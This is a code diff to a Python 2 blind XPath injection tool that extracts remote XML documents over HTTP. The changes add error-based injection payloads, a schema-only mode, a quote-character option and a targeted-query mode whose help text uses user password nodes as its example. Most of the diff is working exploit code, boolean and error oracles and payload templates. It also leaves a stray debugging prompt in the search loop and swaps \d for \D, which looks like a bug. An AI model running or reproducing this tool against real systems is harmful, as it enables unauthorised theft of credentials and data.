@@ -15,6 +15,12 @@ import threading
 
 writer = XMLWriter(sys.stdout)
 
+def ExtractDefinedNodeSet(query):
+    node_count = countChildNodes(query.replace("$COUNT","*"), bigstuff=True)
+    print "Found %s nodes, extracting"%node_count
+    for i in xrange(1, node_count+1):
+        GetXMLFromNode( query.replace("$COUNT", str(i)) )
+
 def GetXMLFromNode(node):
     if not args.connectback:
         name_size = countStuff(payloads.get_name_length, node="name(%s)"%node, bigstuff=True)
@@ -30,28 +36,29 @@ def GetXMLFromNode(node):
             attributes[attribute] = value
     
     writer.start(currentName, attrib=attributes)
-    
-    commentCount = countChildNodes(node+"/comment()")
 
-    if commentCount:
-        for i in xrange(1, commentCount+1):
-            commentsize = countContents(node+"/comment()[%s]"%i)
-            comment = getNodeValue(node+"/comment()[%s]"%i, commentsize)
-            if comment:
-                writer.comment(comment)
+    if not args.schema_only:
+        commentCount = countChildNodes(node+"/comment()")
+        if commentCount:
+            for i in xrange(1, commentCount+1):
+                commentsize = countContents(node+"/comment()[%s]"%i)
+                comment = getNodeValue(node+"/comment()[%s]"%i, commentsize)
+                if comment:
+                    writer.comment(comment)
     
     childNodeCount = countChildNodes(node+"/*")
     if childNodeCount:
         for i in xrange(1, childNodeCount+1):
             GetXMLFromNode(node+"/*[%s]"%i)
-    if not args.connectback:
-        nodesize = countContents(node+"/text()")
-    else:
-        nodesize = 0
-    #print repr(nodesize)
-    nodeValue = getNodeValue(node+"/text()", nodesize)
-    if nodeValue:
-        writer.data(nodeValue)
+
+    if not args.schema_only:
+        if not args.connectback:
+            nodesize = countContents(node+"/text()")
+        else:
+            nodesize = 0
+        nodeValue = getNodeValue(node+"/text()", nodesize)
+        if nodeValue:
+            writer.data(nodeValue)
     writer.end()
 
 
@@ -72,6 +79,7 @@ class DefinedString(object):
 class PayloadMaker(object):
     
     BASE = string.Template("' and $payload and '1'='1")
+    BASE_ERROR = string.Template("' and (if ($payload) then error() else 0) and '1' = '1")
     
     payloads = {
                 "META":{
@@ -93,16 +101,18 @@ class PayloadMaker(object):
                     
                      "GET_NAME_LENGTH":("string-length(name($node))=$count", ),
                      "GET_CONTENT_LENGTH":("(string-length($node) > $min and string-length($node) <= $max)", ),
+                     "GET_COUNT_LENGTH":("(count($node) > $min and count($node) <= $max)",),
                     },
                 "2":{
                      "COUNT_CHILDREN":("count($node)=$count",),
                      "NODEVALUE_LENGTH":("string-length($node)=$count",),
                     
-                     "GET_NODENAME":("normalize-unicode(substring(name($node),$count,1),'NFKC')","='$character'"),
-                     "GET_NODEVALUE":("normalize-unicode(substring($node,$count,1),'NFKC')","='$character'"),
+                     "GET_NODENAME":("normalize-unicode(substring(name($node),$count,1),'NFKC')", "='$character'"),
+                     "GET_NODEVALUE":("normalize-unicode(substring($node,$count,1),'NFKC')", "='$character'"),
                     
                      "GET_NAME_LENGTH":("string-length(name($node))=$count",),
                      "GET_CONTENT_LENGTH":("(string-length($node) > $min and string-length($node) <= $max)",),
+                     "GET_COUNT_LENGTH":("(count($node) > $min and count($node) <= $max)",),
                      },
     }
     
@@ -128,7 +138,7 @@ class PayloadMaker(object):
     
     
 
-def countStuff(payload, node, bigstuff=False, start=0, end=0):
+def countStuff(payload, node, bigstuff=False, getContentLength=True, start=0, end=0):
     if not bigstuff:
         for i in xrange(start, end or args.search_limit):
             if executeQuery(args.URL, payload(count=i, node=node), args.true_keyword or args.false_keyword):
@@ -136,19 +146,29 @@ def countStuff(payload, node, bigstuff=False, start=0, end=0):
         return False
     
     else:
-        if executeQuery(args.URL, payloads.nodevalue_length(node=node, count=0), args.true_keyword or args.false_keyword):
+        if getContentLength:
+            p = payloads.get_content_length
+            af = payloads.nodevalue_length
+        else:
+            p = payloads.get_count_length
+            af = payloads.count_children
+
+        if executeQuery(args.URL, af(node=node, count=0), args.true_keyword or args.false_keyword):
             return 0
         MIN = 0
         MAX = 10
         for i in xrange(args.step_size):
-            if executeQuery(args.URL, payloads.get_content_length(node=node, min=MIN, max=MAX), args.true_keyword or args.false_keyword):
-                return countStuff(payloads.nodevalue_length, node, bigstuff=False, start=MIN, end=MAX)
+
+
+
+            if executeQuery(args.URL, p(node=node, min=MIN, max=MAX), args.true_keyword or args.false_keyword):
+                return countStuff(af, node, bigstuff=False, start=MIN, end=MAX)
             MIN+=10
             MAX+=10
     
 
-def countChildNodes(node):
-    return countStuff(payloads.count_children, node=node)
+def countChildNodes(node, bigstuff=False):
+    return countStuff(payloads.count_children, node=node, bigstuff=bigstuff, getContentLength=False)
 
 def countAttributes(node):
     return countStuff(payloads.count_children, node=node)
@@ -252,11 +272,12 @@ def getCharacters(node, payload, size=None, name=False):
             if not args.lowercase:
                 spaces+=(("[A-Z]",string.uppercase),)
                 
-            spaces+= (("\d",string.digits),
-                      ("\W","""!$%&'()*+,-./_"""),
+            spaces+= (("\D",string.digits),
+                      ("\p{P}","""!$%&'()*+,-./_"""),
                       ("\s"," "))
             
             for pattern,space in spaces:
+                raw_input("SearchSpace: %s"%searchspace)
                 new_node = node
                 if name:
                     new_node = "name(%s)"%node
@@ -266,7 +287,7 @@ def getCharacters(node, payload, size=None, name=False):
                 if executeQuery(args.URL, payloads.BASE.substitute(payload=payloads.wrap_regex.substitute(node=n_pat, pattern=pattern)), 
                                 args.true_keyword or args.false_keyword):
                     searchspace+=space
-            #sys.stderr.write("\nSearchspace found: %s\n"%searchspace)
+
     if args.connectback:
         x = _getCharactersHttp(node, payload, name)
         if x:
@@ -276,6 +297,7 @@ def getCharacters(node, payload, size=None, name=False):
                 size = countContents(payloads.node_name.substitute(node=node))
             else:
                 size = countContents(node)
+
     if not size:
         return _getCharactersSingle(node, payload, searchspace)
     return _getCharactersThreadPool(node, payload, size, searchspace)
@@ -287,18 +309,24 @@ def getCharacter(node, payload, count, searchspace):
                                      node=node, count=count
                                      ), args.true_keyword or args.false_keyword):
             return i
-    return False        
+    return False
+
 
 def executeQuery(url, payload, match_word):
-    #print payload
+    payload = payload.replace("'", args.quote_character)
+
     if args.http_method == "GET":
         data = urllib2.urlopen(args.URL+args.post_argument+urllib.quote_plus(payload)).read()
     else:
         data = urllib2.urlopen(args.URL, data=args.post_argument+urllib.quote_plus(payload)).read()
-    if args.lookup == True:
-        return args.true_keyword in data
+    if args.error_keyword:
+        # Look for an exception
+        return args.error_keyword in data
     else:
-        return not args.false_keyword in data
+        if args.lookup == True:
+            return args.true_keyword in data
+        else:
+            return not args.false_keyword in data
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Read a remote XML file through an XPath injection vulnerability")
@@ -306,11 +334,19 @@ if __name__ == "__main__":
                         default="GET", choices=["GET","POST"], dest="http_method")
     parser.add_argument("--arg", help="POST argument(s) to send. The payload will be appended", type=str, action="store",
                         dest="post_argument")
-    parser.add_argument("--true", help="Keyword that if present indicates a success", dest="true_keyword")
-    parser.add_argument("--false", help="Keyword that if present indicates a failure (And if not present indicates a success)", dest="false_keyword")
+
+    group = parser.add_mutually_exclusive_group()
+    group.add_argument("--true", help="Keyword that if present indicates a success", dest="true_keyword")
+    group.add_argument("--false", help="Keyword that if present indicates a failure (And if not present indicates a success)", dest="false_keyword")
+    group.add_argument("--error", help="Keyword that if present indicates a server error. Used for exploiting injection vectors that give no output, but can be caused to error",
+                                        dest="error_keyword")
+
+    parser.add_argument("--schema_only", help="Only extract the node names and no data", action="store_true", dest="schema_only")
+    parser.add_argument("--quote_character", help="The quote character we will use to inject (normally' or \")", default="\"", dest="quote_character")
+    parser.add_argument("--executequery", help="If given recurse through this query and extract the results, instead of searching from the root node. use $COUNT to insert the current node we are looking at. eg: /users/user[$COUNT]/password",
+                        default="", dest="executequery")
+
     parser.add_argument("--max_search", help="The max number of characters to search to before giving up", dest="search_limit", type=int, default=20)
-    parser.add_argument("--error", help="A keyword that only appears if there is an error with the xpath query. Needed to detect xpath version",
-                        action="store", dest="error_keyword")
     parser.add_argument("--timeout", help="Socket timeout to set", type=int, default=5, dest="timeout", action="store")
     parser.add_argument("--threadpool", help="Thread pool size for large textual items", type=int, default=10, dest="poolsize", action="store")
     parser.add_argument("--stepsize", help="When counting text contents (which could be very large) this is the max number of characters to count up to, times by ten",
@@ -329,9 +365,13 @@ if __name__ == "__main__":
     parser.add_argument("URL", action="store")
     args = parser.parse_args()
     
-    if not args.false_keyword and not args.true_keyword:
-        print "Error: You must supply a false OR a true keyword!"
+    if not any([args.false_keyword, args.true_keyword, args.error_keyword]):
+        print "Error: You must supply a false, true or error keyword"
         sys.exit(1)
+
+    if args.error_keyword:
+        print "In error mode"
+        PayloadMaker.BASE = PayloadMaker.BASE_ERROR
     
     if args.http_method == "POST":
         if not args.post_argument:
@@ -375,6 +415,9 @@ if __name__ == "__main__":
                 continue
             GetXMLFromNode("doc('%s')/*"%file)
     else:
-        GetXMLFromNode("/*")
+        if not args.executequery:
+            GetXMLFromNode("/*")
+        else:
+            ExtractDefinedNodeSet(args.executequery)
     
     threadpool.shutdown(False)
